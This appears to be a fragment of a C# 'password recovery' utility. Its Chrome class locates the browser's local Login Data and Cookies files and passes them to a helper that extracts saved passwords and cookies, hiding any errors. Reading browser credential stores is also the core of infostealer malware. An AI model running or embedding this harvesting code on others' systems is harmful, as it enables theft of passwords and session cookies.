using System;
using System.Collections.Generic;
using System.IO;


namespace SimpleChromepwrec
{
    public class Chrome
    {
        public static List<Field> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<Field>();
            }
        }

        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

    }
}
